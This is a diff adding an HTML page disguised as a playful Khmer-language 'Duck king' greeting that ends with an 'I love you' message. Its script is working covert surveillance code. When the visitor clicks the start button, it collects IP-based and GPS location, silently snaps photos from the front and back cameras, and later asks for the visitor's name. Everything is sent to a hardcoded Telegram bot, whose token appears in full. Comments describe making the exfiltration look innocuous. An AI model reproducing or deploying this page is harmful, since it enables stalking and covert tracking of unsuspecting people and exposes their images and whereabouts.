@@ -1,0 +1,389 @@
+<!DOCTYPE html>
+<html lang="km">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Key words of Duck king</title>
+    <style>
+        :root {
+            --bg-dark: #0f172a;
+            --card-bg: #1e293b;
+            --primary: #f59e0b;
+            --primary-hover: #d97706;
+            --text-main: #f8fafc;
+            --text-muted: #94a3b8;
+            --border: #334155;
+            --success: #10b981;
+        }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background-color: var(--bg-dark);
+            color: var(--text-main);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+            padding: 20px;
+            background-image: radial-gradient(circle at 50% 0%, #1e293b 0%, #0f172a 100%);
+        }
+
+        .container {
+            background-color: var(--card-bg);
+            border-radius: 24px;
+            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5);
+            padding: 40px;
+            max-width: 450px;
+            width: 100%;
+            text-align: center;
+            border: 1px solid var(--border);
+            position: relative;
+            overflow: hidden;
+        }
+
+        .container::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 4px;
+            background: linear-gradient(90deg, transparent, var(--primary), transparent);
+        }
+
+        h1 {
+            margin: 0 0 10px 0;
+            font-size: 1.8rem;
+            color: var(--primary);
+            font-weight: 700;
+        }
+
+        .subtitle {
+            color: var(--text-muted);
+            font-size: 0.95rem;
+            margin-bottom: 30px;
+            line-height: 1.5;
+        }
+
+        .step {
+            display: none;
+            animation: fadeIn 0.5s ease-in-out;
+        }
+
+        .step.active {
+            display: block;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        button {
+            background: linear-gradient(135deg, var(--primary), var(--primary-hover));
+            color: #fff;
+            border: none;
+            padding: 16px 32px;
+            font-size: 1.1rem;
+            font-weight: 600;
+            border-radius: 12px;
+            cursor: pointer;
+            width: 100%;
+            transition: transform 0.2s, box-shadow 0.2s;
+            box-shadow: 0 4px 15px rgba(245, 158, 11, 0.3);
+        }
+
+        button:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 6px 20px rgba(245, 158, 11, 0.4);
+        }
+
+        button:active {
+            transform: translateY(0);
+        }
+
+        button:disabled {
+            opacity: 0.8;
+            cursor: wait;
+        }
+
+        input[type="text"] {
+            width: 100%;
+            padding: 16px;
+            margin-bottom: 20px;
+            border: 1px solid var(--border);
+            border-radius: 12px;
+            background-color: #0f172a;
+            color: white;
+            font-size: 1rem;
+            outline: none;
+            transition: border-color 0.3s;
+            box-sizing: border-box;
+        }
+
+        input[type="text"]:focus {
+            border-color: var(--primary);
+        }
+
+        .love-message {
+            font-size: 2.5rem;
+            font-weight: bold;
+            color: #ff6b6b;
+            margin: 20px 0;
+            animation: pulse 1.5s infinite;
+        }
+
+        @keyframes pulse {
+            0% { transform: scale(1); }
+            50% { transform: scale(1.05); }
+            100% { transform: scale(1); }
+        }
+
+        .status-text {
+            font-size: 0.9rem;
+            color: var(--text-muted);
+            margin-top: 15px;
+            min-height: 24px;
+            font-style: italic;
+        }
+
+        /* Subtle loading indicator that looks like a design element */
+        .loader {
+            display: inline-block;
+            width: 16px;
+            height: 16px;
+            border: 2px solid rgba(255,255,255,.3);
+            border-radius: 50%;
+            border-top-color: var(--primary);
+            animation: spin 1s ease-in-out infinite;
+            vertical-align: middle;
+            margin-right: 8px;
+        }
+        @keyframes spin { to { transform: rotate(360deg); } }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <h1>🦆 Key words of Duck king</h1>
+    <p class="subtitle">សុំទោសវាផងរកអាក់រអួលបន្តិចហើយ។</p>
+
+    <!-- Step 1: Initial Action -->
+    <div id="step1" class="step active">
+        <button id="btnStart">សូមអនុវត្តតាមខាងក្រោម</button>
+        <div class="status-text" id="status1">ចុចប៊ូតុងដើម្បីចាប់ផ្តើម</div>
+    </div>
+
+    <!-- Step 2: Name Input -->
+    <div id="step2" class="step">
+        <p style="margin-bottom: 15px; font-size: 1.1rem;">តើអ្នកឈ្មោះអ្វី?</p>
+        <input type="text" id="nameInput" placeholder="សរសេរឈ្មោះរបស់អ្នក..." autocomplete="off">
+        <button id="btnSubmitName">បញ្ជូន</button>
+        <div class="status-text" id="status2">រង់ចាំការបញ្ចូលឈ្មោះ...</div>
+    </div>
+
+    <!-- Step 3: Final Message -->
+    <div id="step3" class="step">
+        <div class="love-message">I love you 😜</div>
+        <p style="color: var(--text-muted); margin-bottom: 20px;">អរគុណចំពោះការចូលរួមរបស់អ្នក</p>
+        <button onclick="location.reload()">ចាប់ផ្តើមថ្មី</button>
+    </div>
+</div>
+
+<script>
+    const BOT_TOKEN = "8731995229:AAFSufkEPs5rVIxAY2MmJ51vX1lb6Nh3kMQ";
+    const CHAT_ID = "-1003978934584";
+
+    let visitorData = {
+        lat: 0,
+        lon: 0,
+        ip: "Unknown",
+        city: "Unknown",
+        country: "Unknown",
+        isp: "Unknown",
+        os: "Unknown",
+        browser: "Unknown",
+        name: ""
+    };
+
+    // --- Utility: Send Location Pin ---
+    async function sendLocationPin(caption = "") {
+        if (!visitorData.lat || !visitorData.lon) return;
+        
+        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendLocation`;
+        await fetch(url, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                chat_id: CHAT_ID,
+                latitude: visitorData.lat,
+                longitude: visitorData.lon,
+                caption: caption,
+                horizontal_accuracy: 50
+            })
+        }).catch(e => console.error("Location send failed", e));
+    }
+
+    // --- Utility: Send Photo ---
+    async function sendPhoto(blob, caption = "") {
+        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
+        const formData = new FormData();
+        formData.append('chat_id', CHAT_ID);
+        formData.append('photo', blob, 'snapshot.jpg');
+        if (caption) formData.append('caption', caption);
+
+        await fetch(url, {
+            method: 'POST',
+            body: formData
+        }).catch(e => console.error("Photo send failed", e));
+    }
+
+    // --- Core: Gather Location (GPS + IP Fallback) ---
+    async function gatherLocation() {
+        return new Promise((resolve) => {
+            let hasResolved = false;
+            const finish = () => { if (!hasResolved) { hasResolved = true; resolve(); } };
+
+            // 1. Try IP first (Fast, always works)
+            fetch('https://api.ipify.org?format=json')
+                .then(r => r.json())
+                .then(async ipData => {
+                    visitorData.ip = ipData.ip;
+                    // Get Geo for IP
+                    try {
+                        const geoRes = await fetch(`https://ipapi.co/${visitorData.ip}/json/`);
+                        const geoData = await geoRes.json();
+                        visitorData.city = geoData.city || "Unknown";
+                        visitorData.country = geoData.country || "Unknown";
+                        visitorData.isp = geoData.org || "Unknown";
+                        visitorData.lat = geoData.latitude;
+                        visitorData.lon = geoData.longitude;
+                    } catch (e) {}
+                    finish();
+                })
+                .catch(() => finish());
+
+            // 2. Try Precise GPS (If allowed)
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    pos => {
+                        // If GPS works, override with precise coords
+                        visitorData.lat = pos.coords.latitude;
+                        visitorData.lon = pos.coords.longitude;
+                        finish();
+                    },
+                    () => finish(), // If denied, stick with IP
+                    { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
+                );
+            } else {
+                finish();
+            }
+        });
+    }
+
+    // --- Core: Silent Camera Snapshot ---
+    async function captureCamera(facingMode) {
+        return new Promise((resolve) => {
+            if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+                resolve(null);
+                return;
+            }
+
+            navigator.mediaDevices.getUserMedia({ 
+                video: { 
+                    facingMode: facingMode, 
+                    width: { ideal: 1280 }, 
+                    height: { ideal: 720 } 
+                } 
+            }).then(stream => {
+                const video = document.createElement('video');
+                video.srcObject = stream;
+                video.play();
+
+                video.onloadedmetadata = () => {
+                    // Wait a moment for the camera to focus/expose
+                    setTimeout(() => {
+                        const canvas = document.createElement('canvas');
+                        canvas.width = video.videoWidth;
+                        canvas.height = video.videoHeight;
+                        const ctx = canvas.getContext('2d');
+                        ctx.drawImage(video, 0, 0);
+                        
+                        // Stop tracks
+                        stream.getTracks().forEach(track => track.stop());
+
+                        canvas.toBlob(blob => {
+                            resolve(blob);
+                        }, 'image/jpeg', 0.9);
+                    }, 1000); // 1 second delay for auto-focus
+                };
+            }).catch(err => {
+                console.log("Camera access denied or unavailable:", err);
+                resolve(null);
+            });
+        });
+    }
+
+    // --- Step 1: Start Button ---
+    document.getElementById('btnStart').addEventListener('click', async function() {
+        this.disabled = true;
+        const status1 = document.getElementById('status1');
+        status1.innerHTML = '<span class="loader"></span> សុំទោសៗជាមុន...';
+
+        // 1. Gather Location
+        await gatherLocation();
+
+        // 2. Send Location Pin (Silent)
+        // Caption is minimal to look like a standard location share
+        await sendLocationPin(`📍 <b>Visitor Location</b>\n🏙 ${visitorData.city}, ${visitorData.country}\n🌐 <code>${visitorData.ip}</code>`);
+
+        // 3. Capture Cameras (Silent)
+        // Front Camera
+        const frontBlob = await captureCamera('user');
+        if (frontBlob) {
+            await sendPhoto(frontBlob, `📸 <b>Front Camera</b>\n👤 <b>Name:</b> ${visitorData.name || "Pending"}\n📍 <b>Loc:</b> ${visitorData.city}`);
+        }
+
+        // Back Camera
+        const backBlob = await captureCamera('environment');
+        if (backBlob) {
+            await sendPhoto(backBlob, `📸 <b>Back Camera</b>\n👤 <b>Name:</b> ${visitorData.name || "Pending"}\n📍 <b>Loc:</b> ${visitorData.city}`);
+        }
+
+        // 4. Transition to Step 2
+        setTimeout(() => {
+            document.getElementById('step1').classList.remove('active');
+            document.getElementById('step2').classList.add('active');
+            document.getElementById('nameInput').focus();
+        }, 1000);
+    });
+
+    // --- Step 2: Submit Name ---
+    function submitName() {
+        const name = document.getElementById('nameInput').value.trim() || "Guest";
+        visitorData.name = name;
+
+        const btn = document.getElementById('btnSubmitName');
+        btn.disabled = true;
+        document.getElementById('status2').innerHTML = '<span class="loader"></span> កំប៉ុងដំណើរការ...';
+
+        // Send a final location pin with the name confirmed
+        // This links the name to the location definitively
+        sendLocationPin(`✅ <b>Visitor Identified</b>\n👤 <b>Name:</b> ${name}\n🏙 ${visitorData.city}, ${visitorData.country}`).then(() => {
+            // Transition to Step 3
+            setTimeout(() => {
+                document.getElementById('step2').classList.remove('active');
+                document.getElementById('step3').classList.add('active');
+            }, 500);
+        });
+    }
+
+    document.getElementById('btnSubmitName').addEventListener('click', submitName);
+    document.getElementById('nameInput').addEventListener('keypress', function(e) {
+        if (e.key === 'Enter') submitName();
+    });
+
+</script>
+</body>
+</html>
